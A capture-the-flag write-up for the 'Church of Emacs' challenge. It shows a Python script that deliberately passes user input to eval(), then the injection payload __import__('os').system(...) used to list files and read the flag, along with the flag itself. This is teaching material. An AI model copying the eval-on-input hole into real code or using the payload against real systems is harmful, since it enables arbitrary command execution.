Title: Church of Emacs

Description:

```
halp hoaw 2 eksit vim :<

nc alpha.8059blank.ml 7001
nc beta.8059blank.ml 7001

Author: Lucas
```

Given hint: \_\_import__ is a very cool builtin btw

Given file: [emacs.py](https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Misc/Church%20of%20Emacs/emacs.py "emacs.py")

It suggests that we use [\_\_import__ exploit using eval() function vulnerability](https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval) which can be done. 

emacs.py:

```
print("Hello! Hope you are a vim fan!")

exits = ["q", "q!", "x", "wq", "wq!", "x!"]

while True:
    print(':', end='')
    inp = input()
    if inp in exits:
        print("This isn't vim sadly...")
        continue
    try:
        print(eval(f'exit({inp})'))
    except Exception as e:
        print(e)
```

We can use the exploit to run shell commands because of the vulnerable eval() function.

Let's open the application using netcat first. 

![image](https://user-images.githubusercontent.com/63996033/197686789-cce64da2-4a9e-4651-b443-ea0afc76759a.png)

We see that we can run shell commands using this technique.

![image](https://user-images.githubusercontent.com/63996033/197686873-19d60f7d-8591-43ad-90cf-17b260c652dd.png)

```__import__('os').system('<shell command>')```

The first shell command we can do is 'ls' to list all files in the directory, then 'cat' open the flag file.

![image](https://user-images.githubusercontent.com/63996033/197687098-bf8cc952-65e1-4f6a-b41e-706ddb75a84a.png)

Flag: ACSI{vivivi}

